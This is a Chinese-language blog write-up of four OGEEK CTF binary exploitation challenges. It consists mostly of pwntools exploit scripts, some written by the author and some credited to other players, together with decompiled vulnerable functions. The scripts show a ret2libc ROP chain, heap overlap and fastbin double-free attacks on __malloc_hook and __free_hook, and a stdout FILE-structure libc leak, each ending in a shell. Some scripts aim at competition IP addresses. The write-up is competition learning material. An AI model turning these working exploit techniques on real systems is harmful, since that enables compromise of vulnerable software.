---
title: OGEEK CTF
categories: 
- OGEEK CTF
---
# OGEEK CTF 

## 前言

前几天的OGEEK CTF，中间有事就没打了，hub是常规题但是由于自己理解不到位没做出来，0 day manager很像之前TSCTF打AWD的那种逻辑很复杂的题目，也是没找到漏洞最后看17学长wp才知道的。。读代码真的是又慢又没耐心又不仔细的我

## babyrop

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./babyrop')

if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./babyrop')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    libc = ELF('./libc-2.23.so')
    p = remote('47.112.137.228',13337)

def exp():


    p.send('\x00'*7+p32(0xff)+'\n')
    p.recvuntil('Correct\n')
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    main_addr = 0x080487d0
    payload = 'a'*0xe7+'a'*4
    payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    p.send(payload)
    libc_base = u32(p.recvn(4)) - libc.symbols['write']
    log.success('libc base => ' + hex(libc_base))
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + libc.search('/bin/sh').next()
    #get shell
    payload = 'a'*0xe7+'a'*4
    payload += p32(system_addr) + 'a'*4+p32(binsh_addr)
    #gdb.attach(p,'b* 0x08048824')
    p.send(payload)

    p.interactive()

exp()

```

## book manager

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./bookmanager')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./bookmanager')

def AddChapter(chapter_name):
    p.recvuntil('choice:')
    p.sendline('1')
    p.recvuntil("Chapter name:")
    p.send(chapter_name)

def AddSection(chapter_name,section_name):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil("Which chapter do you want to add into:")
    p.sendline(chapter_name)
    recv_data = p.recvline().strip('\n')
    p.recvuntil('Section name:')
    p.send(section_name)

def AddText(section_name,size,text):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil("Which section do you want to add into:")
    p.sendline(section_name)
    p.recvuntil('How many chapters you want to write:')
    p.sendline(str(size))
    p.recvuntil('Text:')
    p.send(text)

def RemoveChapter(chapter_name):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('Chapter name:')
    p.sendline(chapter_name)

def RemoveSection(section_name):
    p.recvuntil('choice:')
    p.sendline('5')
    p.recvuntil('Section name:')
    p.sendline(section_name)

def RemoveText(section_name):
    p.recvuntil('choice:')
    p.sendline('6')
    p.recvuntil('Section name:')
    p.sendline(section_name)

def Preview():
    p.recvuntil('choice:')
    p.sendline('7')

def Update(update_type,name_1,new_content):
    p.recvuntil('choice:')
    p.sendline('8')
    p.recvuntil('What to update?(Chapter/Section/Text):')
    p.sendline(update_type)
    p.recvuntil('name:')
    p.send(name_1)
    p.recvuntil(':')
    p.send(new_content)

def exp():
    p.recvuntil('Name of the book you want to create: ')
    p.sendline('xmzyshypnc')
    #leak libc
    AddChapter('0'*8)
    '''
    AddChapter('1'*8)
    AddChapter('2'*8)
    AddChapter('3'*8)
    AddChapter('4'*8)
    '''
    AddSection('0'*8,'a'*8)
    AddSection('0'*8,'b'*8)
    AddSection('0'*8,'c'*8)
    AddSection('0'*8,'d'*8)
    AddSection('0'*8,'e'*8)
    AddSection('0'*8,'f'*8)
    AddSection('0'*8,'g'*8)
    AddText('a'*8,0x80,'A'*8)
    AddText('b'*8,0x68,'B'*8)#
    AddText('c'*8,0xf8,'C'*8)
    AddText('d'*8,0xf8,'D'*8)
    RemoveText('a'*8)
    Update('Text','b'*8,'a'*0x60+p64(0x100)+p64(0x100))
    RemoveText('c'*8)
    AddText('a'*8,0x80,'A'*8)
    Preview()
    p.recvuntil('Section:bbbbbbbb')
    p.recvuntil('Text:')
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - libc_offset - 88
    log.success('libc base => ' + hex(libc_base))
    fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
    log.success('fake chunk addr => ' + hex(fake_chunk))
    shell_addr = libc_base + gadgets[1]
    #get shell
    AddText('e'*8,0x68,'E'*8)# B & E
    RemoveText('e'*8)
    Update('Text','b'*8,p64(fake_chunk))
    AddText('e'*8,0x68,'E'*8)

    AddText('f'*8,0x68,'a'*0x13+p64(shell_addr))
    #gdb.attach(p)
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil("Which section do you want to add into:")
    p.sendline('g'*8)
    p.recvuntil('How many chapters you want to write:')
    p.sendline(str(0x20))


    p.interactive()

exp()
```

## hub

### 漏洞利用

输入的index可以是负数，存在double free，这里一次只能覆写8个字节，卡在次数不够多次覆写stdout，看e3pem大佬的exp才知道一是没有PIE的情况下可以通过bss上的stdout和stderr劫持方式去分配到stdout，二是只修改stdout的flag字段及write_base即可泄露libc，下面的exp为大佬的exp。

```c
__int64 __fastcall main_func(char *a1)
{
  __int64 result; // rax
  signed int choice; // eax
  char *ptr; // ST28_8
  unsigned int v4; // [rsp+8h] [rbp-28h]
  unsigned int size; // [rsp+14h] [rbp-1Ch]
  char *chunk_addr; // [rsp+18h] [rbp-18h]
  char *v7; // [rsp+20h] [rbp-10h]

  v4 = 0x27;
  chunk_addr = 0LL;
  v7 = 0LL;
  while ( 1 )
  {
    result = v4--;
    if ( !(_DWORD)result )
      break;
    menu();
    choice = read_int();
    if ( choice == 2 )
    {
      puts("Which hub don't you want?");
      ptr = &v7[(signed int)read_int()];        // 负数
      free(ptr);                                // double free
      if ( chunk_addr == ptr )
        chunk_addr = 0LL;
    }
    else if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        puts("What do you want?");
        read(0, chunk_addr, 8uLL);
      }
      else if ( choice == 4 )
      {
        puts("Bye");
        exit(0);
      }
    }
    else if ( choice == 1 )
    {
      puts("How long will you stay?");
      size = read_int();
      if ( size > 0x400 )
        chunk_addr = 0LL;
      else
        chunk_addr = (char *)malloc(size);
      if ( !chunk_addr )
      {
        puts("Malloc faild");
        exit(-1);
      }
      v7 = chunk_addr;
    }
  }
  return result;
}
```

### e3pem.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./hub')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./hub')

def Malloc(size):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil("How long will you stay?")
    p.sendline(str(size))

def Free(index):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil("Which hub don't you want?")
    p.sendline(str(index))


def Write(content):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil("want?")
    p.send(content)

def exp():
    Malloc(0x50)
    Malloc(0x40)
    Malloc(0x60)
    Malloc(0x30)
    Malloc(0x30)
    Free(-0x40)
    Free(-0x40)
    Free(-(0x40+0x70))
    Free(-(0x40+0x70))
    Free(-(0x40+0x70+0x50))
    Free(-(0x40+0x70+0x50))
    Free(-(0x40+0x70+0x50+0x60))
    Free(-(0x40+0x70+0x50+0x60))


    #write stdout flag
    Malloc(0x30)
    Write(p64(0x602020))
    Malloc(0x30)
    Malloc(0x30)
    Malloc(0x30)
    Write(p64(0xfbad1800))

    Malloc(0x40)
    Write(p64(0x602040))
    Malloc(0x40)
    Malloc(0x40)
    Write('\x79\x07\xdd')

    Malloc(0x50)
    Write(p64(0x602040))
    Malloc(0x50)
    Malloc(0x50)
    Malloc(0x50)
    Write(p64(0))


    p.recvn(8)
    libc_addr = u64(p.recvn(6).ljust(8,'\x00'))
    log.success('libc addr => ' + hex(libc_addr))
    libc_base = libc_addr - (0x7ffff7dd18b0-0x7ffff79e4000)
    log.success('libc addr => ' + hex(libc_base))
    #get shell
    Malloc(0x60)
    Write(p64(libc_base+libc.symbols['__free_hook']))
    Malloc(0x60)
    Malloc(0x60)
    Write(p64(libc_base+libc.symbols['system']))
    Malloc(0x70)
    Write('/bin/sh\x00')
    gdb.attach(p,'b* 0x400a53')
    Free(0)


    p.interactive()

exp()
```

## 0day manager

### 漏洞分析

题目可以分配不同类型的chunk，这里的Handle在for循环的free之后有一个while循环，当num不为0的时候会执行``v14 = (_QWORD *)*v14;``得到0之后会清空上次释放的堆地址，否则还是将原地址赋给相应位置，从而下次Handlle Double Free，注意calloc用的是_int_malloc而不是_libc_malloc，因此不会用Tcache的机制分配，最后利用的是fastbin。

```c
_QWORD *Handle()
{
  void **ptr; // ST50_8
  int v1; // eax
  void *v2; // ST58_8
  _QWORD *result; // rax
  void **v4; // ST40_8
  int v5; // eax
  void *v6; // ST48_8
  void **v7; // ST30_8
  int v8; // eax
  void *v9; // ST38_8
  int num; // [rsp+Ch] [rbp-54h]
  int v11; // [rsp+10h] [rbp-50h]
  int choice; // [rsp+14h] [rbp-4Ch]
  _QWORD *k; // [rsp+18h] [rbp-48h]
  _QWORD *v14; // [rsp+18h] [rbp-48h]
  _QWORD *i; // [rsp+20h] [rbp-40h]
  _QWORD *v16; // [rsp+20h] [rbp-40h]
  _QWORD *j; // [rsp+28h] [rbp-38h]
  _QWORD *v18; // [rsp+28h] [rbp-38h]

  puts("Which type 0day you want to delete?");
  puts("1. Leak");
  puts("2. Memory corruption");
  puts("3. Logic");
  choice = read_int();
  printf("How many you want to handle in?");
  num = read_int();
  v11 = num;
  if ( choice == 2 )
  {
    for ( i = *(_QWORD **)(*(_QWORD *)(qword_203050 + 8) + 8LL); i; i = (_QWORD *)*i )
    {
      v4 = (void **)i[1];
      free(v4[1]);
      free(v4[3]);
      free(v4[5]);
      free(v4);
      if ( !--v11 )
        break;
    }
    v16 = *(_QWORD **)(*(_QWORD *)(qword_203050 + 8) + 8LL);
    while ( v16 )
    {
      v5 = num--;
      if ( !v5 )
        break;
      v6 = v16;
      v16 = (_QWORD *)*v16;
      free(v6);
    }
    result = v16;
    *(_QWORD *)(*(_QWORD *)(qword_203050 + 8) + 8LL) = v16;
  }
  else if ( choice == 3 )
  {
    for ( j = *(_QWORD **)(*(_QWORD *)(qword_203050 + 8) + 16LL); j; j = (_QWORD *)*j )
    {
      v7 = (void **)j[1];
      free(v7[1]);
      free(v7[3]);
      free(v7);
      if ( !--v11 )
        break;
    }
    v18 = *(_QWORD **)(*(_QWORD *)(qword_203050 + 8) + 16LL);
    while ( v18 )
    {
      v8 = num--;
      if ( !v8 )
        break;
      v9 = v18;
      v18 = (_QWORD *)*v18;
      free(v9);
    }
    result = v18;
    *(_QWORD *)(*(_QWORD *)(qword_203050 + 8) + 16LL) = v18;
  }
  else
  {
    if ( choice != 1 )
    {
      puts("Wrong choice");
      exit(1);
    }
    for ( k = **(_QWORD ***)(qword_203050 + 8); k; k = (_QWORD *)*k )
    {
      ptr = (void **)k[1];
      free(ptr[1]);
      free(ptr[3]);
      free(ptr);
      if ( !--v11 )
        break;
    }
    v14 = **(_QWORD ***)(qword_203050 + 8);
    while ( v14 )
    {
      v1 = num--;
      if ( !v1 )
        break;
      v2 = v14;
      v14 = (_QWORD *)*v14;
      free(v2);
    }
    result = *(_QWORD **)(qword_203050 + 8);
    *result = v14;
  }
  return result;
}
```

### 17.py

```py
from pwn import *


def add(p, vul_type, data_size, data, note_size, note, offset='', shellcode_size=0, shellcode=''):
    p.sendlineafter('0day\n', '1')
    if vul_type == 'l':
        p.sendlineafter('bug\n', '1')
        p.sendlineafter('size :', str(data_size))
        p.sendafter('data :', data)
        p.sendlineafter('size :', str(note_size))
        p.sendafter('note :', note)
        p.sendafter('offset :', offset)
    elif vul_type == 'm':
        p.sendlineafter('bug\n', '2')
        p.sendlineafter('size :', str(data_size))
        p.sendafter('data :', data)
        p.sendlineafter('size :', str(note_size))
        p.sendafter('note :', note)
        p.sendlineafter('size :', str(shellcode_size))
        p.sendafter('shellcode :', shellcode)


def show(p, vul_type):
    p.sendlineafter('0day\n', '2')
    if vul_type == 'l':
        p.sendlineafter('3. Logic\n', '1')


def delete(p, vul_type):
    p.sendlineafter('0day\n', '3')
    if vul_type == 'l':
        p.sendlineafter('3. Logic\n', '1')


def handle(p, vul_type, count):
    p.sendlineafter('0day\n', '4')
    if vul_type == 'l':
        p.sendlineafter('3. Logic\n', '1')
    elif vul_type == 'm':
        p.sendlineafter('3. Logic\n', '2')


    p.sendlineafter('handle in?', str(count))


def pwn():
    context.terminal = ['tmux', 'split', '-h']
    context.log_level = 'debug'

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    DEBUG = 1
    if DEBUG == 1:
        p = process('./0day_manage')
    else:
        p = remote('47.112.137.133', 12345)


    if DEBUG == 1:
        pass



    add(p, 'l', 0x200, 'sunichi', 0x410, 'sunichi', offset='sunichi')
    gdb.attach(p)

    handle(p, 'l', 1)
    handle(p, 'l', 1)
    show(p, 'l')
    p.recvuntil('note :')
    libc.address = u64(p.recv(8)) - (0x7fa22c3e6ca0 - 0x00007fa22bffb000)

    add(p, 'm', 0x68, 'sunichi', 0x68, 'sunichi', shellcode_size=0x68, shellcode='cat flag')
    #add(p, 'l', 0x20, 'sunichi', 0x20, 'sunichi', 'sunichi')




    handle(p, 'm', 0)
    handle(p, 'm', 0)
    handle(p, 'm', 0)
    handle(p, 'm', 0)


    add(p, 'm', 0x68, p64(libc.symbols['__malloc_hook'] - 0x23), 0x68, 'sunichi', shellcode_size=0x68, shellcode='sunichi')
    #add(p, 'm', 0x68, 'sunichi', 0x68, , shellcode_size=0x18, shellcode='sunichi')

    p.sendlineafter('0day\n', '1')
    p.sendlineafter('bug\n', '2')
    p.sendlineafter('size :', str(0x68))
    p.sendafter('data :', 'sunichi')
    p.sendlineafter('size :', str(0x68))
    p.sendafter('note :', '\x00\x00\x00' + p64(0) + p64(libc.address+0x4f2c5) + p64(libc.symbols['realloc'] + 2))


    p.interactive()
    p.close()
#flag{f4491f7f790a0dc010dcfb0fae927790}

if __name__ == '__main__':
    pwn()

```
